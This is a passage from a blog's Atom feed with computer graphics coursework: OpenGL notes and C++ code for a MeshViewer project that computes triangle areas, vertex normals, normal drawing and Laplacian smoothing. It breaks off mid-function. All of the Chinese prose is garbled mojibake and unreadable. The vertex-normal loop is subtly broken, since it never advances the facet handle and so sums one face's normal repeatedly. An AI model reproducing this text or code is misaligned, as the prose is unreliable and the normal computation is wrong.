<code>glEnable(GL_NORMALIZE);</code>ï¼Œ<code>glEnable(GL_NORMALIZE)</code>æ˜¯ä½¿<code>opengl</code>è‡ªåŠ¨normalize æ³•å‘é‡ï¼Œä¹‹æ‰€ä»¥éœ€è¦è‡ªåŠ¨normalize æ³•å‘é‡æ˜¯å› ä¸ºæ³•å‘é‡ä¼šå—åˆ°<code>glScalef</code>çš„å½±å“ï¼Œå½“<code>glScalef</code>å°†ç‰©ä½“çš„åæ ‡æ”¾å¤§kå€æ—¶ï¼Œæ³•å‘é‡å˜ä¸º1/kï¼Œå› ä¸ºopenglè‡ªå·±çš„å…‰ç…§è®¡ç®—è¦æ±‚æ³•å‘é‡å•ä½åŒ–ï¼Œæ‰€ä»¥ä¸é‡æ–°å•ä½åŒ–ï¼Œè®¡ç®—ç»“æœå°±æ˜¯é”™è¯¯çš„ã€‚<br>ä¸¾ä¸ªä¾‹å­å°±æ˜¯å¦‚æœä¸æ·»åŠ <code>glEnable(GL_NORMALIZE);</code>åœ¨<code>display</code>å‡½æ•°ä¸­æ”¾å¤§ä¸€ä¸ªå‡ ä½•ç‰©ä½“å®ƒçš„äº®åº¦å°±ä¼šå˜æš—ã€‚</p><p>åœ¨<code>display</code>å‡½æ•°ä¸­æ·»åŠ <code>glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</code>ç”¨äºæ¸…é™¤ç¼“å†²åŒºã€‚</p><p>åœ¨<code>display</code>å‡½æ•°ä¸­æ‰€æœ‰ä»£ç å¤–å¥—ä¸€ä¸ª<code>glPushMatrix();</code>å’Œ<code>glPopMatrix();</code>ä¿è¯æ¯æ¬¡å›è°ƒæ—¶çš„çŸ©é˜µæ ˆä¸ºç©ºã€‚</p><h2 id="ç¨‹åºä¸€ï¼šåŠ¨ç”»æ•ˆæœæ¼”ç¤º"><a href="#ç¨‹åºä¸€ï¼šåŠ¨ç”»æ•ˆæœæ¼”ç¤º" class="headerlink" title="ç¨‹åºä¸€ï¼šåŠ¨ç”»æ•ˆæœæ¼”ç¤º"></a>ç¨‹åºä¸€ï¼šåŠ¨ç”»æ•ˆæœæ¼”ç¤º</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/%E4%BD%9C%E4%B8%9A%E4%B8%80/%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C" target="_blank" rel="noopener">æºç </a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/0bFl5AJ2L5.png?imageslim" alt="mark"></p><h2 id="ç¨‹åºäºŒï¼š3D-room-scene"><a href="#ç¨‹åºäºŒï¼š3D-room-scene" class="headerlink" title="ç¨‹åºäºŒï¼š3D room scene"></a>ç¨‹åºäºŒï¼š3D room scene</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/ä½œä¸šä¸€/æˆ¿é—´è®¾è®¡" target="_blank" rel="noopener">æºç </a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/h4G05EK5Cb.png?imageslim" alt="mark"></p><iframe src="//player.bilibili.com/player.html?aid=34258956&cid=60010777&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/</id>
        <title><![CDATA[è®¡ç®—æœºå›¾å½¢å­¦finalal_project:MeshViewer]]></title>
        <updated>2018-11-09T12:03:21+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"><![CDATA[<h2 id="ä»£ç è§£è¯»"><a href="#ä»£ç è§£è¯»" class="headerlink" title="ä»£ç è§£è¯»"></a>ä»£ç è§£è¯»</h2><p>a.é¦–å…ˆä»<code>meshviewer.cpp</code>çœ‹èµ·ï¼Œé‡Œé¢åŒ…å«mainå‡½æ•°å…¥å£ï¼Œæ‰“å°ä½¿ç”¨è¯´æ˜ï¼Œè®¾ç½®çª—å£ä¿¡æ¯ï¼Œåˆå§‹åŒ–ç¯å…‰æè´¨ç­‰ä¿¡æ¯ï¼Œåˆ›å»ºèœå•ï¼Œç»˜åˆ¶å›¾åƒï¼Œçª—å£å¤§å°å˜åŒ–å›è°ƒï¼Œé¼ æ ‡ç‚¹å‡»å’Œç§»åŠ¨å›è°ƒï¼Œé»˜è®¤å›è°ƒï¼Œé”®ç›˜å›è°ƒï¼Œç½‘æ ¼æ¨¡å‹å¤„ç†ï¼Œä¸»å¾ªç¯</p><p>b.ç„¶åè¦è¯»æ‡‚çš„æ˜¯<code>MeshInterface.h</code>æ–‡ä»¶ï¼ŒåŒ…å«ç½‘æ ¼æ¨¡å‹å¤„ç†çš„æ“ä½œï¼Œäº†è§£<code>glNewList</code>å’Œ<code>glCallList</code></p><p>c.æ¥ç€çœ‹å†…æ ¸å¤´æ–‡ä»¶ï¼Œ<code>Kernal.h</code>å’Œ<code>ExKernal.h</code>é‡ŒåŒ…å«äº†æ‰€æœ‰åé¢å†™ä»£ç è¦ç”¨åˆ°çš„å‡½æ•°å£°æ˜ï¼Œ<code>Kernal.h</code>ä¸­è¦æ³¨æ„çš„æ˜¯ä½•ç§åŠè¾¹å¥æŸ„çš„è½¬æ¢å‡½æ•°ï¼Œ<code>ExKernal.h</code>ä¸­çš„é«˜çº§åŠŸèƒ½å‡½æ•°éœ€è¦äº†è§£</p><h2 id="æç¤º"><a href="#æç¤º" class="headerlink" title="æç¤º"></a>æç¤º</h2><p>a.å…¶ä¸­1. 2. 4. 5çš„å‡½æ•°å£°æ˜åœ¨ mesh/extension/ExKernelT.h (æˆªå›¾å¦‚ä¸‹)<br>å‡½æ•°å®ç°è¯·åœ¨mesh/extension/ExkernelT.cpp ä¸­å®Œæˆ (åŠ¡å¿…)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/ie20LdjLk0.png?imageslim" alt="mark"></p><p>b.å…¶ä¸­3çš„å‡½æ•°å£°æ˜åœ¨read_write/read_write.h<br>å‡½æ•°å®ç°è¯·åœ¨read_write/read_write.cpp ä¸­å®Œæˆ (åŠ¡å¿…)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/JmeG2b7D19.png?imageslim" alt="mark"></p><p>c.è¯·æŠŠæ•´ä¸ªä»£ç çœ‹æ˜ç™½ï¼Œé‡Œé¢å®ç°äº†å„ç§åŸºæœ¬æ“ä½œï¼Œä¾‹å¦‚æ±‚ä¸‰è§’ç½‘æ ¼ä¸­æ¯ä¸ªä¸‰è§’å½¢çš„é‡å¿ƒã€æ±‚æ¯ä¸ªä¸‰è§’é¢ç‰‡çš„æ³•å‘ç­‰ç­‰ã€‚</p><p>d.ç¨‹åºè¿è¡Œæˆªå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/eaf9Ghl9AG.png?imageslim" alt="mark"></p><p>e.é¼ æ ‡ç‚¹å‡»å³é”®ï¼Œä¼šå‡ºç°ä¸€ä¸ªæ“ä½œç•Œé¢ï¼Œé‡Œé¢æœ‰ä¸€äº›ç¯å…‰å’Œå…¶ä»–ç»˜åˆ¶æ•ˆæœã€‚</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/Gga208dGIg.png?imageslim" alt="mark"></p><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><blockquote><p>è®¡ç®—ä¸‰è§’ç½‘æ ¼ä¸­æ¯ä¸ªä¸‰è§’å½¢(face)çš„é¢ç§¯ï¼›10åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸ºï¼š Scalar calc_facet_area(const FacetHandle&amp; _fh); //ç»™å®šä¸€ä¸ªä¸‰è§’é¢ç‰‡ï¼Œè®¡ç®—å®ƒçš„é¢ç§¯<br>Tips: å¯ä»¥æ ¹æ®ç¨‹åºè¾“å‡ºç»“æœåˆ¤å®šæ˜¯å¦è®¡ç®—æ­£ç¡®ï¼Œä¾‹å¦‚ï¼Œè¾“å…¥æ¨¡å‹cow.offï¼Œå®ƒçš„æ‰€æœ‰ä¸‰è§’é¢ç‰‡ä¸­ï¼Œé¢ç§¯æœ€å¤§çš„ä¸‰è§’é¢ç‰‡çš„é¢ç§¯ä¸ºï¼šThe maximal area of the mesh is: 0.0494426</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Scalar</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_facet_area(<span class="keyword">const</span> FacetHandle&amp; _fh)&#123;<span class="comment">/////è®¡ç®—ä¸‰è§’å½¢çš„é¢ç§¯</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">///å¾—åˆ°åŠè¾¹å¥æŸ„</span></span><br><span class="line">    HalfedgeHandle&amp; hh1 = halfedge_handle(_fh);</span><br><span class="line">    HalfedgeHandle&amp; hh2 = next_halfedge_handle(hh1);</span><br><span class="line">    HalfedgeHandle&amp; hh3 = next_halfedge_handle(hh2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////ç”±åŠè¾¹å¥æŸ„å¾—åˆ°è¾¹å¥æŸ„</span></span><br><span class="line">    EdgeHandle&amp; eh1 = edge_handle(hh1);</span><br><span class="line">    EdgeHandle&amp; eh2 = edge_handle(hh2);</span><br><span class="line">    EdgeHandle&amp; eh3 = edge_handle(hh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////ç”±è¾¹å¥æŸ„å¾—åˆ°å„è¾¹é•¿</span></span><br><span class="line">    <span class="keyword">float</span> a = calc_edge_length(eh1);</span><br><span class="line">    <span class="keyword">float</span> b = calc_edge_length(eh2);</span><br><span class="line">    <span class="keyword">float</span> c = calc_edge_length(eh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////åˆ©ç”¨æµ·ä¼¦å…¬å¼æ±‚é¢ç§¯s=sqrt(p(p-a)(p-b)(p-c))</span></span><br><span class="line">    Scalar area = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> p = (a + b + c) / <span class="number">2</span>;</span><br><span class="line">    area = <span class="built_in">sqrt</span>(p*(p - a)*(p - b)*(p - c));</span><br><span class="line"></span><br><span class="line">    facet_ref(_fh).area_ = area;</span><br><span class="line">    <span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/d8DIbDC712.png?imageslim" alt="mark"></p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><blockquote><p>è®¡ç®—ä¸‰è§’ç½‘æ ¼ä¸­æ¯ä¸ªé¡¶ç‚¹(vertex) çš„æ³•å‘ï¼›20åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸ºï¼šinline Normal calc_normal(const VertexHandle&amp; _vh);///è®¡ç®—é¡¶ç‚¹çš„æ³•å‘å€¼<br>Tips: æ³¨æ„å½’ä¸€åŒ–ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Normal</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_normal(<span class="keyword">const</span> VertexHandle&amp; _vh) &#123;<span class="comment">////æ›´æ–°ä¸€ä¸ªé¡¶ç‚¹çš„æ³•å‘</span></span><br><span class="line">    assert( _vh.is_valid());</span><br><span class="line">    assert( _vh.idx() &lt; vertex_size() );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Normal          norm(1,1,1);///////ç”¨normå­˜å‚¨æ±‚å¾—çš„æ³•å‘å€¼</span></span><br><span class="line">    <span class="function">Normal          <span class="title">norm</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////åœ¨æ­¤å®ç°////////////////////////////////////</span></span><br><span class="line">    HalfedgeHandle firstHH = halfedge_handle(_vh);</span><br><span class="line">    FacetHandle fh = facet_handle(firstHH);</span><br><span class="line">    norm = norm + calc_normal(fh);</span><br><span class="line">    HalfedgeHandle hh = opposite_halfedge_handle(next_halfedge_handle(firstHH));</span><br><span class="line">    <span class="keyword">while</span> (hh != firstHH) &#123;</span><br><span class="line">      norm = norm + calc_normal(fh);</span><br><span class="line">      hh = opposite_halfedge_handle(next_halfedge_handle(hh));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> norm.normalize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><blockquote><p>ç”¨OpenGLæŠŠä¸‰è§’ç½‘æ ¼ä¸­æ¯ä¸ªä¸‰è§’é¢ç‰‡(face)çš„æ³•å‘ç”»å‡ºæ¥ï¼ˆæç¤ºï¼šåœ¨æ¯ä¸ªä¸‰è§’é¢ç‰‡çš„é‡å¿ƒå¤„ç”»ï¼‰ï¼›20åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸ºï¼šbool ogl_writer2(bool _orient = true, bool _smooth = false);<br>Tips: å¯ä»¥å‚ç…§å‡½æ•°bool ogl_writer(bool  _orient = true, bool _smooth = false)çš„æ¥å®ç°ï¼Œè¿™æ—¶åªéœ€è¦åœ¨æ¯ä¸ªä¸‰è§’é¢ç‰‡ä¸­ç”»å‡ºæ³•å‘å³å¯ï¼ˆæ³•å‘ç”¨Lineè¡¨ç¤ºã€‚æŒ‰é”®ç›˜ä¸Šâ€mâ€å¯ä»¥æŸ¥çœ‹ç”»å‡ºé¢ç‰‡æ³•å‘åçš„ç»“æœã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Mesh</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">ReaderWriterT</span>&lt;Mesh&gt;:</span>:ogl_writer2(<span class="keyword">bool</span> _orient, <span class="keyword">bool</span> _smooth)&#123;<span class="comment">////åœ¨é‡Œé¢æŠŠä¸‰è§’é¢ç‰‡æ³•å‘ç”»å‡º</span></span><br><span class="line">  HalfedgeHandle       cshh;</span><br><span class="line">  Mesh::FacetIterator  fit(mesh_-&gt;facet_begin());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//glShadeModel(GL_FLAT);</span></span><br><span class="line">    glShadeModel(GL_SMOOTH);</span><br><span class="line">    <span class="keyword">int</span> orient = <span class="literal">true</span>;<span class="comment">// (_orient) ? 1 : -1; </span></span><br><span class="line">    mesh_-&gt;update_normals();<span class="comment">//è®¡ç®—é¢æ³•å‘å’Œç‚¹æ³•å‘</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; fit != mesh_-&gt;facet_end(); ++fit) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((*fit).status_.is_deleted()) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      cshh = fit-&gt;halfedge_handle_;</span><br><span class="line">      FacetHandle fh = mesh_-&gt;facet_handle(cshh);</span><br><span class="line">      <span class="keyword">const</span> VertexHandle&amp; vh0 = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line">      glColor3f(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">      glBegin(GL_LINES);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> VertexHandle&amp; vh = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//glNormal3fv(mesh_-&gt;normal(fh)*orient);</span></span><br><span class="line">        <span class="comment">//glVertex3fv(mesh_-&gt;coord(vh));</span></span><br><span class="line">        cshh = mesh_-&gt;next_halfedge_handle(cshh);</span><br><span class="line">        </span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh));</span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh) + mesh_-&gt;normal(fh));</span><br><span class="line">      &#125; <span class="keyword">while</span> (cshh != fit-&gt;halfedge_handle_);</span><br><span class="line">      glEnd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹:</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/3FF0CJmga7.png?imageslim" alt="mark">  </p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><blockquote><p>å®ç°ä¸€ç§ç®€å•çš„ä¸‰è§’ç½‘æ ¼å»å™ªç®—æ³•ï¼ˆä¾‹å¦‚æ‹‰æ™®æ‹‰æ–¯å…‰é¡ºï¼‰ï¼›30åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸ºï¼švoid Laplacian_Smoothing();//////////////////å®ç°ä¸€ç§ä¸‰è§’ç½‘æ ¼å»å™ªç®—æ³•<br>Tips: å¯ä»¥å‚ç…§å·²ç»å®ç°çš„ä¸¤ä¸ªå»å™ªç®—æ³•ï¼›æŒ‰é”®ç›˜ä¸Šâ€bâ€å¯ä»¥æŸ¥çœ‹å»å™ªç»“æœã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Laplacian_Smoothing()&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/////è¯·å®ç°è‡ªå·±çš„å»å™ªç®—æ³•////////</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input laplacian vertex update iterations(5-30æ¬¡): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"ç”±äºè¿­ä»£ï¼Œæ¯”è¾ƒè€—æ—¶ï¼"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] /= j;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ = updateVertexPosition[i];</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of laplacian vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š<br>å»å™ªå‰<img src="https://qiniu.karlrixon.cn/blog/181029/kagkgc82Eb.png?imageslim" alt="mark">å»å™ªå<img src="https://qiniu.karlrixon.cn/blog/181029/b8ED4jA0lE.png?imageslim" alt="mark"></p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><blockquote><p>ï¼ˆå¯é€‰/å¯åšå¯ä¸åšï¼‰å®ç°ä¸€ç§åŸºäºä¸‰è§’ç½‘æ ¼çš„æ“ä½œï¼ˆä¾‹å¦‚ï¼Œç‰¹å¾æå–ï¼Œä¸‰è§’ç½‘æ ¼åˆ†å‰²ï¼Œä¸‰è§’ç½‘æ ¼å˜å½¢ç­‰ç­‰ï¼‰ï¼›20åˆ†</p></blockquote><p>æ­¤å‡½æ•°å£°æ˜ä¸º: void mesh_process();</p><p>æ€è·¯ï¼šå…ˆæ±‚å‡ºä¸€ä¸ªç‚¹çš„ä¸€ç¯é‚»æ¥é¡¶ç‚¹ï¼Œå°†æ¯ä¸ªç‚¹åˆ°è¯¥é¡¶ç‚¹çš„å‘é‡ç›¸åŠ ï¼Œå°†ç®—å¾—çš„å‘é‡åŠ åˆ°è¯¥ç‚¹åŸåæ ‡ä¸Šå¾—åˆ°æ–°åæ ‡ã€‚æ­¥éª¤æ˜¯å…ˆè®¡ç®—æ¯ä¸ªç‚¹çš„æ–°åæ ‡ï¼Œå­˜å‚¨åˆ°å®¹å™¨ï¼Œç„¶åç»Ÿä¸€ä¿®æ”¹ç¨‹åºä¸­meshçš„é¡¶ç‚¹æ•°æ®ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:mesh_process()&#123;<span class="comment">///////(å¯é€‰ï¼Œåœ¨ä¸‰è§’ç½‘æ ¼ä¸Šå®ç°ä¸€ç§æ“ä½œï¼Œä¾‹å¦‚ç‰¹å¾æå–ï¼Œç½‘æ ¼åˆ†å‰²ï¼Œä¸‰è§’ç½‘æ ¼å˜å½¢ç­‰ç­‰)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input sharpening vertex update iterations(1-30æ¬¡): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"ç”±äºè¿­ä»£ï¼Œæ¯”è¾ƒè€—æ—¶ï¼"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    